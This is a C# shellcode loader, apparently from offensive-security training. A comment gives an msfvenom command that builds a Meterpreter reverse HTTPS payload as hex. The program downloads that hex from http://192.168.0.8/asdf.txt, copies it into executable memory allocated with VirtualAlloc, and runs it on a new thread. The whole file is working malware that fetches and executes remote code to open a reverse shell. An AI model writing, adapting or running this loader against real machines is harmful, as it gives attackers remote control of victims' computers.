using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;


//msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.0.8 lport=443 -f raw | od -A n -t x1 | sed 's/^ *// ' | sed 's / *//g' | tr -d "\n" > asdf.txt
 

namespace Runner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect
            );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress, 
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            IntPtr lpThreadId
            );

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle, 
            UInt32 dwMilliseconds
            );

        public static byte[] FromHex(string hex)
        {
            hex = hex.Replace("-", "");
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }

        static void Main(string[] args)
        {

            WebClient req = new WebClient();
            string asdf = req.DownloadString("http://192.168.0.8/asdf.txt");
            byte[] buf = FromHex(asdf);

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}
